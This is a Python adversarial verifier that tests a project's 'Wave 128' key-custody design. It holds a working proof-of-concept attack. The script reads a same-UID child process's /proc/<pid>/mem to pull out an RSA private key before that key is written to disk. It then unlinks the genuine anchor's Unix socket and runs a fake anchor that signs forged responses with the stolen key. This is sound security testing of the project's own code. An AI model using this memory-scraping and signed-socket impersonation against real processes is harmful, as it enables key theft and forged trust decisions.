#!/usr/bin/env python3
"""Independent adversarial verifier for Wave 128 initializer key custody.

Wave 128 removes the global temp-file handoff for response signing and makes the
long-lived anchor plus OpenSSL crypto children non-dumpable before secret-key
access. This verifier challenges a different same-UID boundary: the ordinary
Python process that runs initialize_anchor_dir() is not made non-dumpable.

The child runs the real Wave 128 initializer. A verifier-only hook pauses at the
natural private-key persistence boundary, immediately before the production
_atomic_write(response_private.pem, private_pem, ...) call. No private key file
exists yet. The parent is the same Unix uid, has no CAP_SYS_PTRACE, and reads
only its direct child's ordinary /proc/<pid>/mem surface. If a valid RSA private
key matching the witness-pinned Wave 128 public verifier can be recovered, that
key is then used to repeat the prior signed Unix-socket substitution attack
while the genuine anchor process/store remain alive and one sequence behind.

Expected vulnerable verdict:
FAIL_INITIALIZER_DUMPABLE_MEMORY_EXPOSES_RESPONSE_KEY_AND_REOPENS_SUBSTITUTION

Verifier lane only / NON-CANON / do not auto-merge.
"""
from __future__ import annotations

import argparse
import ctypes
import errno
import hashlib
import json
import os
import signal
import socket
import subprocess
import sys
import tempfile
import threading
import time
from pathlib import Path

import AXM_FLOWING_COMPUTE_PROCESS_WITNESS as w
import AXM_FLOWING_COMPUTE_PROCESS_WITNESS_ANCHORED as w126
import AXM_FLOWING_COMPUTE_PROCESS_WITNESS_KEY_CUSTODY as c

TOOL = Path(c.__file__).resolve()
VERDICT = "FAIL_INITIALIZER_DUMPABLE_MEMORY_EXPOSES_RESPONSE_KEY_AND_REOPENS_SUBSTITUTION"
PR_GET_DUMPABLE = 3
CAP_SYS_PTRACE = 19


def h(text: str) -> str:
    return hashlib.sha256(text.encode()).hexdigest()


def wait_file(path: Path, proc: subprocess.Popen | None = None,
              timeout: float = 12.0) -> None:
    end = time.time() + timeout
    while time.time() < end:
        if path.exists():
            return
        if proc is not None and proc.poll() is not None:
            out, err = proc.communicate()
            raise RuntimeError(
                f"process-exited-before-ready:{proc.returncode}:{out}:{err}"
            )
        time.sleep(0.02)
    raise TimeoutError(f"marker-timeout:{path}")


def hard_kill(proc: subprocess.Popen | None) -> None:
    if proc is None or proc.poll() is not None:
        return
    try:
        os.kill(proc.pid, signal.SIGKILL)
    except ProcessLookupError:
        return
    proc.wait(timeout=3)


def stop_witness(proc: subprocess.Popen | None, sock: Path) -> None:
    if proc is None or proc.poll() is not None:
        return
    try:
        w.request(sock, {"op": "stop"}, timeout=1.0)
    except Exception:
        pass
    try:
        proc.wait(timeout=2)
    except subprocess.TimeoutExpired:
        hard_kill(proc)


def cap_eff() -> int:
    for line in Path("/proc/self/status").read_text().splitlines():
        if line.startswith("CapEff:"):
            return int(line.split()[1], 16)
    return -1


def child_dumpable() -> int:
    libc = ctypes.CDLL(None, use_errno=True)
    rc = libc.prctl(PR_GET_DUMPABLE, 0, 0, 0, 0)
    if rc < 0:
        err = ctypes.get_errno()
        raise OSError(err, "prctl(PR_GET_DUMPABLE) failed")
    return int(rc)


def private_key_valid(pem: bytes) -> bool:
    try:
        cp = subprocess.run(
            ["openssl", "pkey", "-noout", "-check"],
            input=pem,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            check=False,
            timeout=3,
        )
    except Exception:
        return False
    return cp.returncode == 0


def _candidate_pems(blob: bytes) -> list[bytes]:
    # Construct markers at runtime; any source-code/string false positive still
    # has to parse as a real private key before it is accepted.
    begin = b"-----BEGIN " + b"PRIVATE KEY-----"
    end = b"-----END " + b"PRIVATE KEY-----"
    out: list[bytes] = []
    pos = 0
    while True:
        start = blob.find(begin, pos)
        if start < 0:
            break
        stop = blob.find(end, start + len(begin))
        if stop >= 0:
            stop += len(end)
            if stop < len(blob) and blob[stop:stop + 1] == b"\n":
                stop += 1
            candidate = blob[start:stop]
            if 500 <= len(candidate) <= 8192:
                out.append(candidate)
        pos = start + 1
    return out


def scan_child_memory(pid: int) -> tuple[bytes | None, dict]:
    maps = Path(f"/proc/{pid}/maps").read_text().splitlines()
    fd = os.open(f"/proc/{pid}/mem", os.O_RDONLY)
    scanned = 0
    regions = 0
    errors: list[str] = []
    try:
        for line in maps:
            parts = line.split(None, 5)
            if len(parts) < 2:
                continue
            addr, perms = parts[0], parts[1]
            if not perms.startswith("r") or "w" not in perms:
                continue
            start_s, end_s = addr.split("-", 1)
            start, end = int(start_s, 16), int(end_s, 16)
            region_size = end - start
            if region_size <= 0:
                continue
            # Writable CPython arenas/heap contain the returned private bytes.
            # Bound reads so this stays a custody proof, not a giant memory dump.
            regions += 1
            region_limit = min(region_size, 128 * 1024 * 1024)
            pos = start
            limit = start + region_limit
            overlap = b""
            while pos < limit and scanned < 512 * 1024 * 1024:
                want = min(1024 * 1024, limit - pos)
                try:
                    chunk = os.pread(fd, want, pos)
                except OSError as exc:
                    if exc.errno not in (errno.EIO, errno.EFAULT, errno.EPERM, errno.EACCES):
                        errors.append(f"{type(exc).__name__}:{exc}")
                    break
                if not chunk:
                    break
                scanned += len(chunk)
                probe = overlap + chunk
                for pem in _candidate_pems(probe):
                    if private_key_valid(pem):
                        return pem, {
                            "bytes_scanned": scanned,
                            "writable_regions_considered": regions,
                            "read_errors": errors,
                        }
                overlap = probe[-8192:]
                pos += len(chunk)
        return None, {
            "bytes_scanned": scanned,
            "writable_regions_considered": regions,
            "read_errors": errors,
        }
    finally:
        os.close(fd)


def child_initialize(base: Path) -> int:
    wd = base / "witness"
    ad = base / "anchor"
    pause = base / "initializer.pause.json"
    release = base / "initializer.release"
    done = base / "initializer.done.json"
    error = base / "initializer.error.txt"
    try:
        w.initialize_witness_dir(wd, "wave128-init-memory-witness")
        original_atomic = w._atomic_write
        paused = False

        def hooked_atomic(path, data, mode=0o600):
            nonlocal paused
            p = Path(path)
            if not paused and p.name == c.PRIVATE_KEY and p.parent == ad:
                paused = True
                pause.write_text(json.dumps({
                    "pid": os.getpid(),
                    "uid": os.getuid(),
                    "euid": os.geteuid(),
                    "dumpable": child_dumpable(),
                    "private_path_exists_before_write": p.exists(),
                    "private_bytes_argument_length": len(data),
                }, sort_keys=True) + "\n")
                while not release.exists():
                    time.sleep(0.01)
            return original_atomic(path, data, mode)

        w._atomic_write = hooked_atomic
        try:
            root = c.initialize_anchor_dir(ad, wd, "wave128-init-memory-anchor")
        finally:
            w._atomic_write = original_atomic
        done.write_text(json.dumps(root, sort_keys=True) + "\n")
        return 0
    except BaseException as exc:
        error.write_text(f"{type(exc).__name__}:{exc}\n")
        raise


def launch_anchor(anchor_dir: Path, sock: Path, ready: Path,
                  error: Path) -> tuple[subprocess.Popen, dict]:
    for p in (ready, error):
        try:
            p.unlink()
        except FileNotFoundError:
            pass
    proc = subprocess.Popen(
        [
            sys.executable, str(TOOL), "serve-anchor", str(anchor_dir), str(sock),
            "--ready-file", str(ready), "--error-file", str(error),
        ],
        stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True,
    )
    wait_file(ready, proc)
    return proc, json.loads(ready.read_text())


def launch_witness(witness_dir: Path, sock: Path, anchor_sock: Path,
                   anchor_fp: str, ready: Path,
                   error: Path) -> tuple[subprocess.Popen, dict]:
    for p in (ready, error):
        try:
            p.unlink()
        except FileNotFoundError:
            pass
    proc = subprocess.Popen(
        [
            sys.executable, str(TOOL), "serve-witness", str(witness_dir), str(sock),
            str(anchor_sock), anchor_fp,
            "--ready-file", str(ready), "--error-file", str(error),
        ],
        stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True,
    )
    wait_file(ready, proc)
    return proc, json.loads(ready.read_text())


class SignedSubstituteAnchor:
    """Fake pathname endpoint using only the key recovered from initializer memory."""

    def __init__(self, sock: Path, anchor_fp: str, witness_fp: str,
                 response_fp: str, stolen_private_path: Path):
        self.sock = sock
        self.anchor_fp = anchor_fp
        self.witness_fp = witness_fp
        self.response_fp = response_fp
        self.stolen_private_path = stolen_private_path
        self.seen: list[dict] = []
        self.ready = threading.Event()
        self.stop = threading.Event()
        self.error: str | None = None
        self.thread = threading.Thread(target=self._run, daemon=True)

    def start(self) -> None:
        self.thread.start()
        if not self.ready.wait(5):
            raise TimeoutError("signed-substitute-not-ready")
        if self.error:
            raise RuntimeError(self.error)

    def close(self) -> None:
        self.stop.set()
        try:
            with socket.socket(socket.AF_UNIX, socket.SOCK_STREAM) as s:
                s.settimeout(0.2)
                s.connect(str(self.sock))
                s.sendall(b"{}\n")
        except Exception:
            pass
        self.thread.join(timeout=2)

    def _run(self) -> None:
        listener = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        try:
            listener.bind(str(self.sock))
            listener.listen(16)
            listener.settimeout(0.2)
            self.ready.set()
            while not self.stop.is_set():
                try:
                    conn, _ = listener.accept()
                except socket.timeout:
                    continue
                with conn:
                    data = b""
                    while not data.endswith(b"\n"):
                        chunk = conn.recv(65536)
                        if not chunk:
                            break
                        data += chunk
                    if not data:
                        continue
                    try:
                        request = json.loads(data)
                    except Exception:
                        continue
                    if not isinstance(request, dict) or "payload" not in request:
                        continue
                    self.seen.append(request)
                    payload = request.get("payload")
                    records = payload.get("records") if isinstance(payload, dict) else []
                    records = records or []
                    head = records[-1]["record_sha"] if records else "0" * 64
                    body = {
                        "ok": True,
                        "anchor_credential_fingerprint": self.anchor_fp,
                        "witness_credential_fingerprint": self.witness_fp,
                        "response_public_fingerprint": self.response_fp,
                        "anchor_seq": len(records),
                        "anchor_record_sha": "e" * 64,
                        "witness_record_sha": head,
                        "appended": 0,
                        "idempotent": True,
                    }
                    response = c._signed_response(
                        self.anchor_fp, request, body, self.stolen_private_path
                    )
                    conn.sendall(w.canonical(response) + b"\n")
        except BaseException as exc:
            self.error = f"{type(exc).__name__}:{exc}"
            self.ready.set()
        finally:
            try:
                listener.close()
            except Exception:
                pass


def run() -> dict:
    report = {
        "wave": 128,
        "verifier": "initializer dumpable-memory custody / signed socket substitution",
        "verdict": None,
        "attack_reproduced": False,
        "controls": [],
        "truth_boundary": [
            "same Linux host and same Unix uid; verifier is direct parent of the initialization process",
            "verifier has no CAP_SYS_PTRACE and performs no anchor-store read before key recovery",
            "private-key file does not exist when process memory is read",
            "the production Wave 128 initializer path is used; verifier hook only pauses immediately before its private-key atomic write",
            "captured bytes must parse as a real RSA private key and match the witness-pinned public verifier",
            "genuine anchor process and durable anchor store remain alive and untouched during signed socket substitution",
            "no witness credential, anchor HMAC credential, durable ledger, hash, or signature is forged",
            "not a hostile-kernel/root/cross-host, performance, energy, or retained/incremental/dormant-compute result",
        ],
    }

    with tempfile.TemporaryDirectory(prefix="axm-wave128-init-memory-verifier-") as td:
        b = Path(td)
        wd = b / "witness"
        ad = b / "anchor"
        pause = b / "initializer.pause.json"
        release = b / "initializer.release"
        done = b / "initializer.done.json"
        init_error = b / "initializer.error.txt"
        stolen_path = b / "captured-response-private.pem"
        wsock = b / "witness.sock"
        asock = b / "anchor.sock"
        local = b / "local.jsonl"

        init_proc = subprocess.Popen(
            [sys.executable, str(Path(__file__).resolve()), "--child-init", str(b)],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True,
        )
        p_anchor = p_witness = None
        fake = None
        try:
            wait_file(pause, init_proc)
            pause_info = json.loads(pause.read_text())
            effective_caps = cap_eff()
            no_ptrace_cap = effective_caps >= 0 and not bool(effective_caps & (1 << CAP_SYS_PTRACE))
            same_uid = pause_info.get("uid") == os.getuid() == pause_info.get("euid")
            private_absent = not (ad / c.PRIVATE_KEY).exists() and not pause_info.get(
                "private_path_exists_before_write", True
            )

            captured = None
            scan_detail = {}
            scan_error = ""
            try:
                captured, scan_detail = scan_child_memory(init_proc.pid)
            except Exception as exc:
                scan_error = f"{type(exc).__name__}:{exc}"

            report["controls"].append({
                "name": "initializer_is_dumpable_same_uid_before_private_key_write",
                "ok": (
                    same_uid and no_ptrace_cap and private_absent
                    and pause_info.get("dumpable") == 1
                ),
                "detail": {
                    "pause": pause_info,
                    "parent_uid": os.getuid(),
                    "parent_euid": os.geteuid(),
                    "parent_cap_eff_hex": hex(effective_caps),
                    "parent_has_cap_sys_ptrace": not no_ptrace_cap,
                    "private_path_exists_observed_by_parent": (ad / c.PRIVATE_KEY).exists(),
                },
            })
            report["controls"].append({
                "name": "ordinary_parent_proc_mem_recovers_valid_private_key_before_persistence",
                "ok": captured is not None and private_absent and no_ptrace_cap,
                "detail": {
                    **scan_detail,
                    "scan_error": scan_error,
                    "captured_bytes": len(captured or b""),
                    "private_path_absent_during_scan": private_absent,
                },
            })

            if captured is None:
                report["verdict"] = "INCONCLUSIVE_INITIALIZER_MEMORY_KEY_NOT_RECOVERED"
                return report

            stolen_path.write_bytes(captured)
            os.chmod(stolen_path, 0o600)
            release.write_text("release\n")
            init_out, init_err = init_proc.communicate(timeout=12)
            if init_proc.returncode != 0:
                raise RuntimeError(
                    f"initializer-failed:{init_proc.returncode}:{init_out}:{init_err}:"
                    + (init_error.read_text() if init_error.exists() else "")
                )
            if not done.exists():
                raise RuntimeError("initializer-finished-without-done-record")

            anchor_root = json.loads(done.read_text())
            anchor_fp = anchor_root["anchor_credential_fingerprint"]
            witness_root, witness_secret = w.load_identity(wd)
            witness_fp = witness_root["credential_fingerprint"]
            binding, public_key = c.load_response_binding(wd, anchor_fp)
            response_fp = binding["response_public_fingerprint"]
            probe = b"AXM-W128-INITIALIZER-MEMORY-POSSESSION-PROBE"
            probe_sig = c._sign_memfd(stolen_path, probe)
            stolen_key_matches = c._verify_memfd(public_key, probe, probe_sig)
            report["controls"].append({
                "name": "recovered_memory_key_matches_exact_witness_pinned_response_identity",
                "ok": stolen_key_matches,
                "detail": {
                    "response_public_fingerprint": response_fp,
                    "captured_bytes": len(captured),
                },
            })
            if not stolen_key_matches:
                report["verdict"] = "MEMORY_BYTES_DID_NOT_MATCH_PINNED_KEY"
                return report

            p_anchor, ainfo = launch_anchor(
                ad, asock, b / "anchor.ready", b / "anchor.error"
            )
            p_witness, winfo = launch_witness(
                wd, wsock, asock, anchor_fp, b / "witness.ready", b / "witness.error"
            )

            a1, t1 = h("wave128-init-memory-a1"), h("wave128-init-memory-t1")
            first = w.decide_and_publish(
                wsock, witness_fp, local, a1, t1, "COMMIT", True, ""
            )
            aroot, asecret, anchor_copy_of_witness_secret = w126.load_anchor_identity(ad)
            genuine_before = w126.load_anchor_ledger(
                ad, aroot, asecret, anchor_copy_of_witness_secret
            )
            report["controls"].append({
                "name": "genuine_prefix_is_anchored_before_substitution",
                "ok": first["record"]["seq"] == 1 and len(genuine_before) == 1,
                "detail": {
                    "anchor_ready": ainfo,
                    "witness_ready": winfo,
                    "genuine_anchor_seq": len(genuine_before),
                },
            })

            # Leave genuine process/store alive. Replace only the mutable socket
            # pathname, then sign exact fresh Wave 128 envelopes with the key
            # recovered from initializer memory.
            asock.unlink()
            fake = SignedSubstituteAnchor(
                asock, anchor_fp, witness_fp, response_fp, stolen_path
            )
            fake.start()

            a2, t2 = h("wave128-init-memory-a2"), h("wave128-init-memory-t2")
            second = w.decide_and_publish(
                wsock, witness_fp, local, a2, t2, "COMMIT", True, ""
            )
            second_status = w.status(wsock, witness_fp, local, a2)
            witness_rows = w.load_ledger(wd, witness_secret)
            genuine_after = w126.load_anchor_ledger(
                ad, aroot, asecret, anchor_copy_of_witness_secret
            )

            reproduced = (
                second["record"]["seq"] == 2
                and len(witness_rows) == 2
                and second_status.get("status") == "AUTHORITATIVE_PROCESS_WITNESS_COMMIT"
                and len(genuine_after) == 1
                and p_anchor.poll() is None
                and len(fake.seen) >= 2
            )
            report["attack_reproduced"] = bool(reproduced)
            report["verdict"] = VERDICT if reproduced else "ATTACK_DID_NOT_REPRODUCE"
            report["attack"] = {
                "second_decision_seq": second["record"]["seq"],
                "witness_rows": len(witness_rows),
                "genuine_anchor_rows": len(genuine_after),
                "genuine_anchor_alive": p_anchor.poll() is None,
                "fake_signed_requests": len(fake.seen),
                "status": second_status,
                "private_key_source": "same-uid direct-child process memory before response_private.pem existed",
                "anchor_store_read_before_capture": False,
                "anchor_store_modified": False,
                "cap_sys_ptrace_used": False,
            }
            return report
        finally:
            if init_proc.poll() is None:
                try:
                    release.write_text("release\n")
                except Exception:
                    pass
                hard_kill(init_proc)
            if fake is not None:
                fake.close()
            stop_witness(p_witness, wsock)
            hard_kill(p_anchor)


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--report")
    ap.add_argument("--child-init")
    ap.add_argument("child_base", nargs="?")
    ns = ap.parse_args()
    if ns.child_init:
        return child_initialize(Path(ns.child_init))
    report = run()
    text = json.dumps(report, indent=2, sort_keys=True)
    print(text)
    if ns.report:
        Path(ns.report).write_text(text + "\n")
    return 0 if report.get("attack_reproduced") else 1


if __name__ == "__main__":
    raise SystemExit(main())
